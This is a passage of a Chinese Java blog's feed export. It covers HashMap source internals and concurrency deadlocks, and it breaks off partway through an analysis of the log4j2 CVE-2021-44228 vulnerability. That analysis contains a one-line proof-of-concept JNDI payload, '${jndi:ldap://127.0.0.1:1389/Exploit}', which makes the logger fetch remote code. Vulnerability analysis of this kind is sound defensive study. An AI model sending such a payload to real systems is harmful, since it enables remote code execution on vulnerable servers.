key</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> value the value to put</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> onlyIfAbsent if true, don&#x27;t change existing value</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> evict if false, the table is in creation mode.</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span> previous value, or null if none</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">final</span> V <span class="title">putVal</span><span class="params">(<span class="keyword">int</span> hash, K key, V value, <span class="keyword">boolean</span> onlyIfAbsent,</span></span></span><br><span class="line"><span class="function"><span class="params">                 <span class="keyword">boolean</span> evict)</span> </span>&#123;</span><br><span class="line">      Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; <span class="keyword">int</span> n, i;</span><br><span class="line">    <span class="comment">// 如果table没初始化 或者 table的长度为0</span></span><br><span class="line">      <span class="keyword">if</span> ((tab = table) == <span class="keyword">null</span> || (n = tab.length) == <span class="number">0</span>)</span><br><span class="line">          <span class="comment">// 执行resize方法初始化table数组</span></span><br><span class="line">          n = (tab = resize()).length;</span><br><span class="line">    <span class="comment">// 如果 数组长度-1 逻辑与 key的hash 作为下标在数组中不存在</span></span><br><span class="line">      <span class="keyword">if</span> ((p = tab[i = (n - <span class="number">1</span>) &amp; hash]) == <span class="keyword">null</span>)</span><br><span class="line">        <span class="comment">// 直接生成新的Node放在table数组里面</span></span><br><span class="line">          tab[i] = newNode(hash, key, value, <span class="keyword">null</span>);</span><br><span class="line">    <span class="comment">// 说明存在table并且table的对应下标位置有值了</span></span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">          Node&lt;K,V&gt; e; K k;</span><br><span class="line">        <span class="comment">// p是table数组的对应下标Node，这里叫pNode</span></span><br><span class="line">        <span class="comment">// 如果（pNode的hash和key的hash相等）并且（两个的key地址相等 或者两个key equals），直接替换掉pNode。</span></span><br><span class="line">          <span class="keyword">if</span> (p.hash == hash &amp;&amp;</span><br><span class="line">              ((k = p.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">              e = p;</span><br><span class="line">        <span class="comment">// 如果pNode是树（红黑树）节点的话</span></span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> (p <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">            <span class="comment">// 直接调用putTreeVal存入</span></span><br><span class="line">              e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(<span class="keyword">this</span>, tab, hash, key, value);</span><br><span class="line">        <span class="comment">// 说明是链表的形式</span></span><br><span class="line">          <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 递归pNode的next节点</span></span><br><span class="line">              <span class="keyword">for</span> (<span class="keyword">int</span> binCount = <span class="number">0</span>; ; ++binCount) &#123;</span><br><span class="line">                <span class="comment">// 如果不存在next节点了，说明到低了</span></span><br><span class="line">                  <span class="keyword">if</span> ((e = p.next) == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// 直接放在p.next节点</span></span><br><span class="line">                      p.next = newNode(hash, key, value, <span class="keyword">null</span>);</span><br><span class="line">                    <span class="comment">// 如果binCount大于等于7（默认） 链表转换为为红黑树</span></span><br><span class="line">                    <span class="comment">// 实际也就是链表长度大于8的时候 进行转换</span></span><br><span class="line">                      <span class="keyword">if</span> (binCount &gt;= TREEIFY_THRESHOLD - <span class="number">1</span>) <span class="comment">// -1 for 1st</span></span><br><span class="line">                          treeifyBin(tab, hash);</span><br><span class="line">                      <span class="keyword">break</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">                <span class="comment">// 如果（e的hash和key的hash相等）并且（两个的key地址相等 或者 两个key equals），退出当前循环</span></span><br><span class="line">                  <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">                      ((k = e.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">                      <span class="keyword">break</span>;</span><br><span class="line">                  p = e;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        <span class="comment">// 如果存在e</span></span><br><span class="line">          <span class="keyword">if</span> (e != <span class="keyword">null</span>) &#123; <span class="comment">// existing mapping for key</span></span><br><span class="line">            <span class="comment">// 获取老数据</span></span><br><span class="line">              V oldValue = e.value;</span><br><span class="line">            <span class="comment">// 如果 存在既不插入 或者旧值为空，就赋值</span></span><br><span class="line">              <span class="keyword">if</span> (!onlyIfAbsent || oldValue == <span class="keyword">null</span>)</span><br><span class="line">                  e.value = value;</span><br><span class="line">            <span class="comment">// 接口类的方法，LinkedList会实现。</span></span><br><span class="line">              afterNodeAccess(e);</span><br><span class="line">              <span class="keyword">return</span> oldValue;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      ++modCount;</span><br><span class="line">    <span class="comment">// (长度+1)达到了需要扩容容量的大小的时候 进行resize扩容</span></span><br><span class="line">      <span class="keyword">if</span> (++size &gt; threshold)</span><br><span class="line">          resize();</span><br><span class="line">    <span class="comment">// 接口类的方法，LinkedList会实现。</span></span><br><span class="line">      afterNodeInsertion(evict);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h5 id="hash方法"><a href="#hash方法" class="headerlink" title="hash方法"></a>hash方法</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h;</span><br><span class="line">  <span class="comment">// key的hashCode的高16位和低16位进行异或操作的值</span></span><br><span class="line">    <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="get方法"><a href="#get方法" class="headerlink" title="get方法"></a>get方法</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">      Node&lt;K,V&gt; e;</span><br><span class="line">      <span class="keyword">return</span> (e = getNode(key)) == <span class="keyword">null</span> ? <span class="keyword">null</span> : e.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">final</span> Node&lt;K,V&gt; <span class="title">getNode</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">      Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; first, e; <span class="keyword">int</span> n, hash; K k;</span><br><span class="line">    <span class="comment">// table不为空 并且 table的大小大于0 并且 table的大小-1 逻辑与 key的hash() 不为空</span></span><br><span class="line">      <span class="keyword">if</span> ((tab = table) != <span class="keyword">null</span> &amp;&amp; (n = tab.length) &gt; <span class="number">0</span> &amp;&amp;</span><br><span class="line">          (first = tab[(n - <span class="number">1</span>) &amp; (hash = hash(key))]) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 如果hash相同 并且（两个key地址相等或者equals）直接返回这个Node</span></span><br><span class="line">          <span class="keyword">if</span> (first.hash == hash &amp;&amp; <span class="comment">// always check first node</span></span><br><span class="line">              ((k = first.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">              <span class="keyword">return</span> first;</span><br><span class="line">        <span class="comment">// 如果当前Node的next节点不为空</span></span><br><span class="line">          <span class="keyword">if</span> ((e = first.next) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果当前节点是树节点，直接在通过红黑树的方法获取</span></span><br><span class="line">              <span class="keyword">if</span> (first <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">                  <span class="keyword">return</span> ((TreeNode&lt;K,V&gt;)first).getTreeNode(hash, key);</span><br><span class="line">            <span class="comment">// 反之则是链表，通过next节点一直往下寻找</span></span><br><span class="line">              <span class="keyword">do</span> &#123;</span><br><span class="line">                  <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">                      ((k = e.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">                      <span class="keyword">return</span> e;</span><br><span class="line">              &#125; <span class="keyword">while</span> ((e = e.next) != <span class="keyword">null</span>);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h5 id="resize方法"><a href="#resize方法" class="headerlink" title="resize方法"></a>resize方法</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Node&lt;K,V&gt;[] resize() &#123;</span><br><span class="line">    Node&lt;K,V&gt;[] oldTab = table;</span><br><span class="line">  <span class="comment">// 旧数组容量</span></span><br><span class="line">    <span class="keyword">int</span> oldCap = (oldTab == <span class="keyword">null</span>) ? <span class="number">0</span> : oldTab.length;</span><br><span class="line">  <span class="comment">// 旧扩容阈值</span></span><br><span class="line">    <span class="keyword">int</span> oldThr = threshold;</span><br><span class="line">  <span class="comment">// 新的数组容量和扩容阈值</span></span><br><span class="line">    <span class="keyword">int</span> newCap, newThr = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// 旧数组容量&gt;0</span></span><br><span class="line">    <span class="keyword">if</span> (oldCap &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="comment">// 旧数组容量&gt;=最大容量（1&lt;&lt;30）</span></span><br><span class="line">        <span class="keyword">if</span> (oldCap &gt;= MAXIMUM_CAPACITY) &#123;</span><br><span class="line">          <span class="comment">// 设置扩容阈值为最大的int</span></span><br><span class="line">            threshold = Integer.MAX_VALUE;</span><br><span class="line">          <span class="comment">// 扩不了容了，直接返回旧table</span></span><br><span class="line">            <span class="keyword">return</span> oldTab;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="comment">// 新数组容量扩容一倍</span></span><br><span class="line">      <span class="comment">// 如果旧数组容量的两倍&lt;最大容量（1&lt;&lt;30）并且旧容量&gt;=默认的初始化容量（16），</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((newCap = oldCap &lt;&lt; <span class="number">1</span>) &lt; MAXIMUM_CAPACITY &amp;&amp;</span><br><span class="line">                 oldCap &gt;= DEFAULT_INITIAL_CAPACITY)</span><br><span class="line">          <span class="comment">// 新扩容阈值 扩容一倍</span></span><br><span class="line">            newThr = oldThr &lt;&lt; <span class="number">1</span>; <span class="comment">// double threshold</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (oldThr &gt; <span class="number">0</span>) <span class="comment">// initial capacity was placed in threshold</span></span><br><span class="line">        newCap = oldThr;</span><br><span class="line">    <span class="keyword">else</span> &#123;<span class="comment">//               // zero initial threshold signifies using defaults</span></span><br><span class="line">        newCap = DEFAULT_INITIAL_CAPACITY; <span class="comment">// 默认16</span></span><br><span class="line">        newThr = (<span class="keyword">int</span>)(DEFAULT_LOAD_FACTOR * DEFAULT_INITIAL_CAPACITY); <span class="comment">// 默认16*0.75=12</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (newThr == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="comment">// 新扩容阈值为0的时候初始化</span></span><br><span class="line">        <span class="keyword">float</span> ft = (<span class="keyword">float</span>)newCap * loadFactor;</span><br><span class="line">        newThr = (newCap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; (<span class="keyword">float</span>)MAXIMUM_CAPACITY ?</span><br><span class="line">                  (<span class="keyword">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line">    &#125;</span><br><span class="line">    threshold = newThr;</span><br><span class="line">    <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">    Node&lt;K,V&gt;[] newTab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> Node[newCap];</span><br><span class="line">    table = newTab;</span><br><span class="line">    <span class="keyword">if</span> (oldTab != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; oldCap; ++j) &#123;</span><br><span class="line">            Node&lt;K,V&gt; e;</span><br><span class="line">            <span class="keyword">if</span> ((e = oldTab[j]) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                oldTab[j] = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">if</span> (e.next == <span class="keyword">null</span>)</span><br><span class="line">                    newTab[e.hash &amp; (newCap - <span class="number">1</span>)] = e;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (e <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">                  <span class="comment">// 是树节点 调用红黑树的方法</span></span><br><span class="line">                    ((TreeNode&lt;K,V&gt;)e).split(<span class="keyword">this</span>, newTab, j, oldCap);</span><br><span class="line">                <span class="keyword">else</span> &#123; <span class="comment">// preserve order</span></span><br><span class="line">                  <span class="comment">// 链表节点的话 会将一个链表 分成两个链表，一个挂index，一个挂index+oldCap</span></span><br><span class="line">                    Node&lt;K,V&gt; loHead = <span class="keyword">null</span>, loTail = <span class="keyword">null</span>;</span><br><span class="line">                    Node&lt;K,V&gt; hiHead = <span class="keyword">null</span>, hiTail = <span class="keyword">null</span>;</span><br><span class="line">                    Node&lt;K,V&gt; next;</span><br><span class="line">                    <span class="keyword">do</span> &#123;</span><br><span class="line">                        next = e.next;</span><br><span class="line">                        <span class="keyword">if</span> ((e.hash &amp; oldCap) == <span class="number">0</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (loTail == <span class="keyword">null</span>)</span><br><span class="line">                                loHead = e;</span><br><span class="line">                            <span class="keyword">else</span></span><br><span class="line">                                loTail.next = e;</span><br><span class="line">                            loTail = e;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="keyword">if</span> (hiTail == <span class="keyword">null</span>)</span><br><span class="line">                                hiHead = e;</span><br><span class="line">                            <span class="keyword">else</span></span><br><span class="line">                                hiTail.next = e;</span><br><span class="line">                            hiTail = e;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">while</span> ((e = next) != <span class="keyword">null</span>);</span><br><span class="line">                    <span class="keyword">if</span> (loTail != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        loTail.next = <span class="keyword">null</span>;</span><br><span class="line">                        newTab[j] = loHead;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (hiTail != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        hiTail.next = <span class="keyword">null</span>;</span><br><span class="line">                        newTab[j + oldCap] = hiHead;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> newTab;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="链表转树和树转链表"><a href="#链表转树和树转链表" class="headerlink" title="链表转树和树转链表"></a>链表转树和树转链表</h5><p>当链表长度&gt;8的时候 链表会转树，当树长度&lt;6的时候会转链表，那么为什么不设置成一个数呢 比如7？是为了避免转换的太频繁。</p><h5 id="hash计算"><a href="#hash计算" class="headerlink" title="hash计算"></a>hash计算</h5><p>先获取key的hashCode();</p><p>将key的hashCode高16位与自身进行异或操作，得到的值即为hash值</p><p>为什么要这么做？</p><p>是为了扰动的均衡一点。</p><p>jdk1.7</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object k)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">int</span> h = hashSeed;</span><br><span class="line">       <span class="keyword">if</span> (<span class="number">0</span> != h &amp;&amp; k <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">           <span class="keyword">return</span> sun.misc.Hashing.stringHash32((String) k);</span><br><span class="line">       &#125;</span><br><span class="line">　　　　<span class="comment">// 先取key的hashCode再和hashSeed进行异或运算</span></span><br><span class="line">       h ^= k.hashCode();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// This function ensures that hashCodes that differ only by</span></span><br><span class="line">       <span class="comment">// constant multiples at each bit position have a bounded</span></span><br><span class="line">       <span class="comment">// number of collisions (approximately 8 at default load factor).</span></span><br><span class="line">       h ^= (h &gt;&gt;&gt; <span class="number">20</span>) ^ (h &gt;&gt;&gt; <span class="number">12</span>);</span><br><span class="line">       <span class="keyword">return</span> h ^ (h &gt;&gt;&gt; <span class="number">7</span>) ^ (h &gt;&gt;&gt; <span class="number">4</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>jdk1.8</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h;</span><br><span class="line">  <span class="comment">// key的hashCode的高16位和低16位进行异或操作的值</span></span><br><span class="line">    <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为什么从jdk1.7到1.8扰动次数变少？</p><p>我觉得可能是扰动2次效果差不了多少并且操作次数还变少了。</p><h5 id="为什么hashMap的扩容一直是2的倍数？"><a href="#为什么hashMap的扩容一直是2的倍数？" class="headerlink" title="为什么hashMap的扩容一直是2的倍数？"></a>为什么hashMap的扩容一直是2的倍数？</h5><p>这个就要从如何在table里面的定位说起了，首先获取到key的hash，然后将(hash &amp; n-1)来定位到在table的位置，那么为什么要&amp;上n-1呢，我们都知道n是数组的长度，当n为2的倍数时候，</p><p>比如n=16，n-1的二进制就是1111，和hash进行逻辑与操作的时候，最后二进制的后四位决定了在table的位置。</p><p>当扩容一倍 也就是n=32的时候，n-1的二进制就是11111，和hash进行逻辑与操作的时候，最后二进制的后五位决定了在table的位置。</p><p>这就会造成一个现象，举个例子，比如说之前在2这个位置上的Node节点，原先是不管第五位二进制的，现在要管的话要么是0要么</p><p>是1，是0的话那么他的位置不变还是在2这个位置上，是1的话说明他在2+16=18的位置上。</p><p>这样在进行扩容操作的时候不需要像hashTable一样一个一个进行操作，只要对一个table节点里面的链表或者红黑树进行操作，要么还在当前位置，要么在当前+oldCap的位置。</p><h5 id="hashMap是如何解决hash冲突的？"><a href="#hashMap是如何解决hash冲突的？" class="headerlink" title="hashMap是如何解决hash冲突的？"></a>hashMap是如何解决hash冲突的？</h5><p>hashMap是通过链地址法的方式解决hash冲突的，具体就是通过数组+链表（或红黑树）的方式。</p><p>解决hash冲突的几种办法：开发定址法、再hash法、链地址法、建立公共溢出区等。</p><p>参考文献：</p><p>​    <a href="https://tech.meituan.com/2016/06/24/java-hashmap.html">https://tech.meituan.com/2016/06/24/java-hashmap.html</a></p><h3 id="HashTable"><a href="#HashTable" class="headerlink" title="HashTable"></a>HashTable</h3><p>遗留类，数组+链表(头插法)，使用synchronized确保线程安全，同时与ConcurrentHashMap相比性能低，扩容rehash过程是先生成一个新的entry数组，然后将旧的数据一个一个放进来。</p><h3 id="ConcurrentHashMap"><a href="#ConcurrentHashMap" class="headerlink" title="ConcurrentHashMap"></a>ConcurrentHashMap</h3><h3 id="LinkedHashMap"><a href="#LinkedHashMap" class="headerlink" title="LinkedHashMap"></a>LinkedHashMap</h3><h3 id="WeakHashMap"><a href="#WeakHashMap" class="headerlink" title="WeakHashMap"></a>WeakHashMap</h3><h3 id="TreeMap"><a href="#TreeMap" class="headerlink" title="TreeMap"></a>TreeMap</h3><h3 id="EnumMap"><a href="#EnumMap" class="headerlink" title="EnumMap"></a>EnumMap</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Collection&quot;&gt;&lt;a href=&quot;#Collection&quot; class=&quot;headerlink&quot; title=&quot;Collection&quot;&gt;&lt;/a&gt;Collection&lt;/h2&gt;&lt;div class=&quot;tag-plugin image&quot;&gt;&lt;div class=</summary>
      
    
    
    
    <category term="Java" scheme="http://fireflyingup.github.io/categories/Java/"/>
    
    
    <category term="Java" scheme="http://fireflyingup.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java并发</title>
    <link href="http://fireflyingup.github.io/2022/04/21/Java%E5%B9%B6%E5%8F%91/"/>
    <id>http://fireflyingup.github.io/2022/04/21/Java%E5%B9%B6%E5%8F%91/</id>
    <published>2022-04-21T02:40:20.000Z</published>
    <updated>2024-03-11T01:20:28.617Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Java并发"><a href="#Java并发" class="headerlink" title="Java并发"></a>Java并发</h2><h3 id="锁"><a href="#锁" class="headerlink" title="锁"></a>锁</h3><h4 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h4><p>死锁是指两个或两个以上的进程（线程）在执行过程中，由于竞争资源或者由于彼此通信而造成的一种阻塞的现象，若无外力作用，它们都将无法推进下去。此时称系统处于死锁状态或系统产生了死锁，这些永远在互相等待的进程（线程）称为死锁进程（线程）。</p><p>死锁产生的四个条件：</p><ul><li><p>  互斥条件：线程(进程)对于所分配到的资源具有排它性，即一个资源只能被一个线程(进程)占用，直到被该线程(进程)释放</p></li><li><p>  请求与保持条件：一个线程(进程)因请求被占用资源而发生阻塞时，对已获得的资源保持不放。</p></li><li><p>  不剥夺条件：线程(进程)已获得的资源在末使用完之前不能被其他线程强行剥夺，只有自己使用完毕后才释放资源。</p></li><li><p>  循环等待条件：当发生死锁时，所等待的线程(进程)必定会形成一个环路（类似于死循环），造成永久阻塞</p></li></ul><p>如何解决：</p><ul><li>  破坏请求与保持条件：一次性申请所有的资源。</li><li>  破坏不剥夺条件：占用部分资源的线程进一步申请其他资源时，如果申请不到，可以主动释放它占有的资源。</li><li>  破坏循环等待条件：按序申请资源，反序释放资源。</li></ul><h4 id="活锁"><a href="#活锁" class="headerlink" title="活锁"></a>活锁</h4><p>活锁指的是 任务或者执行者没有被阻塞，由于某些条件没有满足，导致一直重复尝试，失败，尝试，失败。 活锁和死锁的区别在于，处于活锁的实体是在不断的改变状态，所谓的“活”， 而处于死锁的实体表现为等待；活锁有可能自行解开，死锁则不能。</p><h3 id="锁饥饿"><a href="#锁饥饿" class="headerlink" title="锁饥饿"></a>锁饥饿</h3><p>饥饿：是指如果线程T1占用了资源R，线程T2又请求封锁R，于是T2等待。T3也请求资源R，当T1释放了R上的封锁后，系统首先批准了T3的请求，T2仍然等待。然后T4又请求封锁R，当T3释放了R上的封锁之后，系统又批准了T4的请求…，T2可能永远等待。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Java并发&quot;&gt;&lt;a href=&quot;#Java并发&quot; class=&quot;headerlink&quot; title=&quot;Java并发&quot;&gt;&lt;/a&gt;Java并发&lt;/h2&gt;&lt;h3 id=&quot;锁&quot;&gt;&lt;a href=&quot;#锁&quot; class=&quot;headerlink&quot; title=&quot;锁&quot;&gt;&lt;/a&gt;</summary>
      
    
    
    
    <category term="Java" scheme="http://fireflyingup.github.io/categories/Java/"/>
    
    
    <category term="Java" scheme="http://fireflyingup.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>log4j2(CVE-2021-44228)漏洞分析</title>
    <link href="http://fireflyingup.github.io/2021/12/12/log4j2-CVE-2021-44228-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://fireflyingup.github.io/2021/12/12/log4j2-CVE-2021-44228-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2021-12-12T11:23:30.000Z</published>
    <updated>2023-12-19T02:11:45.397Z</updated>
    
    <content type="html"><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>log4j 2是apache官方出品的日志框架，是对log4j的一个升级，目前在很多厂商的java项目中被广泛使用，影响力广泛，在2021年11月24日被阿里云团队发现。</p><p>漏洞编号：CVE-2021-44228</p><p>危害等级：严重</p><p>CVSS评分：10</p><p>影响版本：Apache Log4j 2.x &lt; 2.15.0</p><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>poc如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">  System.setProperty(<span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">  logger.error(<span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:1389/Exploit&#125;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功利用截图：</p><div class="tag-plugin image"><div class="image-bg"><img src="/2021/12/12/log4j2-CVE-2021-44228-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211212201409411.png"></div></div><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>首先从logger.error()方法进去进入第一个关键点logIfEnabled方法，在当前方法的做了一个isEnabled判断，主要是将当前的日志打印级别（logger.error()就是error）和配置的默认级别比较，这也就是为什么logger.info不会触发，而logger.error()会。</p><div class="tag-plugin image"><div class="image-bg"><img src="/2021/12/12/log4j2-CVE-2021-44228-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211212202801393.png"></div></div><p>然后沿着logMessage方法往下看，中间很多就跳过了，发现他会进入一个PatternLayout的方法，这个方法有很多个PatternFormatter对打印的日志进行格式处理，其中有个PatternFormatter里面有个converter对象的实现为MessagePatternConverter，这个也就是导致漏洞发生的类，在后面的<a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1">log4j-2.15.0-rc1</a>版本也就是对当前类做了修改。</p><div class="tag-plugin image"><div class="image-bg"><img 